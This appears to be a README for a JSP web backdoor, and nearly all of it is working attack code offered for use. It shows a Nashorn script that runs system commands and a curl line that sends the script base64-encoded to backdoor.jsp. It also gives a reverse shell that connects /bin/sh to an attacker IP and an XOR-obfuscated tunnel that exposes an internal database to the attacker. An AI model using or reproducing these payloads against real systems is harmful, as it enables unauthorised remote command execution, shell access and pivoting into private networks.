# JSPBackdoor
# USAGE:
### Run command
```javascript
try{
    load("nashorn:mozilla_compat.js");
}catch(e){}
importPackage(Packages.java.util);
importPackage(Packages.java.lang);

function execCmd(cmd) {
    try{
        var s = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }catch(e){
        return 'error';
    }
}
execCmd('ifconfig');
```
#### Encode with base64 and send it

```
curl 'http://localhost:8080/backdoor.jsp' -d 'evil=dHJ5ewogICAgbG9hZCgibmFzaG9ybjptb3ppbGxhX2NvbXBhdC5qcyIpOwp9Y2F0Y2goZSl7fQppbXBvcnRQYWNrYWdlKFBhY2thZ2VzLmphdmEudXRpbCk7CmltcG9ydFBhY2thZ2UoUGFja2FnZXMuamF2YS5sYW5nKTsKCmZ1bmN0aW9uIGV4ZWNDbWQoY21kKSB7CiAgICB0cnl7CiAgICAgICAgdmFyIHMgPSBuZXcgamF2YS51dGlsLlNjYW5uZXIoamF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoY21kKS5nZXRJbnB1dFN0cmVhbSgpKS51c2VEZWxpbWl0ZXIoIlxcQSIpOwogICAgICAgIHJldHVybiBzLmhhc05leHQoKSA/IHMubmV4dCgpIDogIiI7CiAgICB9Y2F0Y2goZSl7CiAgICAgICAgcmV0dXJuICdlcnJvcic7CiAgICB9Cn0KZXhlY0NtZCgnaWZjb25maWcnKTsKCQ=='
```
### Reverse Shell

```javascript
try{
    load("nashorn:mozilla_compat.js");
}catch(e){}
importPackage(Packages.java.util);
importPackage(Packages.java.lang);
importPackage(Packages.java.io);
importPackage(Packages.java.net);


function StreamConnector(is,os){
    return function(){
        try{
            var bin  = new BufferedReader( new InputStreamReader( is ) );
            var bout = new BufferedWriter( new OutputStreamWriter( os ) );
            var charArrType =  Java.type("char[]"); 
            var buffer = new charArrType(8192);
            var length;
            while((length = bin.read( buffer, 0, buffer.length))>0){
                bout.write( buffer, 0, length );
                bout.flush();
            }
        } catch(e){
            print(e);
        }
        try {
            if( bin != null )
                bin.close();
            if( bout != null )
                bout.close();
        } catch(  e ){
           
        }
    }
}

var ds = Runtime.getRuntime().exec( "/bin/sh" );
//12.34.56.78 is Atacker IP  & nc -lvp 3308
var ts = new Socket( "12.34.56.78", 3308 );

(new java.lang.Thread(StreamConnector(ds.getInputStream(),ts.getOutputStream()))).start();
(new java.lang.Thread(StreamConnector(ts.getInputStream(),ds.getOutputStream()))).start();
```

### Portmap

#### Attacker: tgcd -n -g 5 -L -p 3306 -q 3305 -k 198


```javascript
try{
    load("nashorn:mozilla_compat.js");
}catch(e){}
importPackage(Packages.java.util);
importPackage(Packages.java.lang);
importPackage(Packages.java.io);
importPackage(Packages.java.net);

var byteArrType =  Java.type("byte[]"); 
var mapType =  Java.type("java.util.HashMap");
var rip = '12.34.56.78';
var rport = 3305;
var toip = '10.0.15.120';
var toport = 3306;
var key = 198;
var cc = new mapType();
 
function StreamConnector(is,os,key){
    return function(){
        try{
            var bin  = new BufferedInputStream( is );
            var bout = new BufferedOutputStream( os );
           
            var buffer = new byteArrType(8192);
            var length;
            while((length = bin.read( buffer, 0, buffer.length))>0){
                for(var i=0; i<length; buffer[i++]^=key);
                bout.write( buffer, 0, length );
                bout.flush();
            }
        } catch(e){
            print(e);
        }
        try {
            if( bin != null )
                bin.close();
            if( bout != null )
                bout.close();
        } catch(  e ){
           
        }
    }
}

function readCmd(socket){
    try {
        var cmd = new byteArrType(1);
        
        socket.getInputStream().read(cmd);
        
        return new java.lang.String(cmd);
    } catch ( e) {
        print(e);
        print("Read failed.Socked Closed");
    }
    return null;
}
function writeCmd(socket,cmd){
    try{
        print("writing "+cmd+" to socket");
        socket.getOutputStream().write(cmd.getBytes());
        return true;
    }catch(e){
        print('write failed')
        return false;
    }
}


while(true){
    var lastTime = System.currentTimeMillis();
    if(cc.get("ctrl")==null){
        try{Thread.sleep(1000);} catch(e){}
    }
    var ctrl = null;
    try{
        ctrl = new Socket(rip, rport);
        cc.put("ctrl", ctrl);
    } catch(e){}
    
    while(cc.get('ctrl')!=null){
        if(lastTime+1000<System.currentTimeMillis()){
            if(!writeCmd(ctrl, "P")){
                try{
                    cc.put("ctrl", null);
                    ctrl.close();
                }catch(e){
                    print("close Ctrl failed");
                }
            }
            lastTime = System.currentTimeMillis();
        }
        
        try{
            var cmd = readCmd(ctrl).trim();
            if("P".equals(cmd)){
                print("recived ping from LL");
                continue;
            }
                
            if("O".equals(cmd)){
                print("LL want new connection");
            
                try{
                    var ll = new Socket(rip, rport);
                    var ss = new Socket(toip,toport);
                    
                    (new java.lang.Thread(StreamConnector(ll.getInputStream(), ss.getOutputStream(),key))).start();
                    (new java.lang.Thread(StreamConnector(ss.getInputStream(), ll.getOutputStream(),key))).start();
    
                }catch(e){
                    continue;
                }
                    
            }
                
            if("C".equals(cmd)){
                cc.put("ctrl", null);
                ctrl.close();
                break;
            }
            
        }catch(e){
            print( "read cmd failed" ); 
            cc.put("ctrl", null);
            ctrl.close();
        }
        
    }
    
    break;
}
```
#### Attacker can connect remote database with 127.0.0.1:3306
